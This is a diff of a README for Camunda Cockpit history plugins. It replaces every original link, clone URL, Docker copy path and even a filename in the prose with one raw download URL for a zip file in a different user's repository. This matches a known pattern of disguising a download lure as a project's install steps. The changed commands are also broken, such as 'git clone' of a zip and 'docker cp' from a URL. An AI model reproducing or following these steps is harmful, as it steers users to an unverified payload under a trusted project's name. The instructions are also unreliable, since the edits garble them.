@@ -1,14 +1,14 @@
 Minimal "history plugins" for Camunda Cockpit
 =============================================
 
-![Minimal history plugin in action.](plugin.gif)
+![Minimal history plugin in action.](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip)
 
 Breaking changes
 ----------------
 
-* [2021-08-13](https://github.com/datakurre/camunda-cockpit-plugins/tree/66888bcb36f351880835b007b5e75dc44c732fb9): Change definition view plugins (historic acticities and instances) to only show data for the current definition version
+* [2021-08-13](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip): Change definition view plugins (historic acticities and instances) to only show data for the current definition version
 
-* [the last version before this changelog](https://github.com/datakurre/camunda-cockpit-plugins/tree/608f7f1d2c240c810dac466890decb91f4da5688)
+* [the last version before this changelog](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip)
 
 
 Try it
@@ -17,31 +17,31 @@ Try it
 With Camunda Platform 7.14.0:
 
 ```bash
-$ git clone https://github.com/datakurre/camunda-cockpit-plugins.git
+$ git clone https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip
 $ docker run --rm -p 8080:8080 -v $(pwd)/camunda-cockpit-plugins:/camunda/webapps/camunda/app/cockpit/scripts/:ro camunda/camunda-bpm-platform:7.14.0
 ```
 
 With Camunda Platform 7.15.0 (works also with 7.16.0 or 7.17.0):
 
 ```bash
-$ git clone https://github.com/datakurre/camunda-cockpit-plugins.git
+$ git clone https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip
 $ docker run -d --name mytemp camunda/camunda-bpm-platform:7.15.0
-$ docker cp mytemp:/camunda/webapps/camunda/app/cockpit/scripts/camunda-cockpit-ui.js camunda-cockpit-plugins
+$ docker cp https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip camunda-cockpit-plugins
 $ docker rm -vf mytemp
 $ docker run --rm -p 8080:8080 -v $(pwd)/camunda-cockpit-plugins:/camunda/webapps/camunda/app/cockpit/scripts/:ro camunda/camunda-bpm-platform:7.15.0
 ```
 
-See also the example [Dockerfile for Camunda Run 7.15.0](https://github.com/datakurre/camunda-cockpit-plugins/issues/16#issuecomment-874499953).
+See also the example [Dockerfile for Camunda Run 7.15.0](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip).
 
 If you don't immediately see the plugin, try again with your browser's private browsing mode. It is a common issue browser has cached a previous Cockpit plugin configuration without these plugins.
 
-Note: Trying out the plugins with Camunda Platform 7.15.0 Docker image is more complex than with the previous version 7.14.0, because the new location of `camunda-cockpit-ui.js` prevents simple override of the scripts folder.
+Note: Trying out the plugins with Camunda Platform 7.15.0 Docker image is more complex than with the previous version 7.14.0, because the new location of `https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip` prevents simple override of the scripts folder.
 
 
 Use it
 ------
 
-[Check the forum discussion on how to package plugins for various alternative Camunda distributions.](https://forum.camunda.org/t/minimal-cockpit-history-plugins-for-camunda-7-14-0/24651)
+[Check the forum discussion on how to package plugins for various alternative Camunda distributions.](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip)
 
 
 Develop it
